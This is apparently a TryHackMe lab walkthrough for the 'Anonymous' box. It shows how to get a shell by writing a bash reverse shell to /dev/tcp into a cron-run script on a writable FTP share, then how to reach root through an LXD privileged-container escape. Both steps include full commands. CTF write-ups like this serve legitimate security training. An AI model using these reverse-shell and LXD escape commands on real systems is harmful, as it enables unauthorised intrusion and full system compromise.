# Anonymous Walkthrough - TryHackMe  

---

### Introduction 

Essentially, the owner of the box left an **FTP directory writable to guests**. Inside, there is a bash script called `clean.sh` that cleans the `/tmp` directory. This script is run by a **cron job**, which means we can **modify files in the FTP share** to include a malicious line of code and gain a shell on the box — part 1 done.  

For privilege escalation, the user we log in as is a member of the **sudo group**. This allows us to leverage **LXD** to get root on the box.  

Let’s jump in!  

---

### Step 1: Nmap Scan

We start with a basic scan:

```
nmap -sC -sV <target-ip>
```

Initially, only two ports were open.

No web server was found, so a full TCP scan was run to check for missed ports.

Two more ports were discovered: standard SMB ports.

### Step 2: Service Analysis

We discovered anonymous FTP login is allowed.

### Step 3: FTP Enumeration

Connect to FTP using:
```
ftp <target-ip>
```
Explore the files on the FTP share:

`To_do.txt – Reminder to disable anonymous login
clean.sh – Bash script deleting /tmp files
removed_files.log – Logs of deleted files`

Since the script is run by cron, modifying clean.sh allows us to inject a reverse shell.
### Step 4: SMB Enumeration

SMB share named pics allowed NULL authentication.

### Step 5: Gaining a Shell

Edit clean.sh and add a bash reverse shell with your IP:
```
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
```
Upload the modified script using FTP put:
```
ftp> put clean.sh
```
Start a listener on your machine:
```
nc -lvnp 4444
```
Wait for the cron job to execute clean.sh. A few seconds later, a shell is obtained.

### Step 6: Capture User Flag

Navigate to the user's home directory:
```
cat user.txt
```
### Step 7: Privilege Escalation

Found potential privilege escalation via LXD.

###Step 8: Exploiting LXD

LXD is Ubuntu's container manager using Linux containers. Users in the lxd group can be exploited to gain root.
`
Download LXD Alpine builder from GitHub.
Build a small Alpine Linux image.
Upload the image to the target machine.
Import the image into LXC:
`
```
lxc image import alpine.tar.gz --alias myalpine
```
Run following commands
```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root
chroot /mnt/root /bin/bash
```
We now have root access on the box.

### Step 9: Capture Root Flag
`
cat /root/root.txt
`
Submit the flag and claim your points!
Conclusion

Exploited writable FTP + cron to get a shell.

Escalated privileges using LXD containers.

Learned about the dangers of sudo group membership and LXD.

References

<a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via LXD</a>

TryHackMe Room: <a href="https://tryhackme.com/room/anonymous">Anonymous</a>
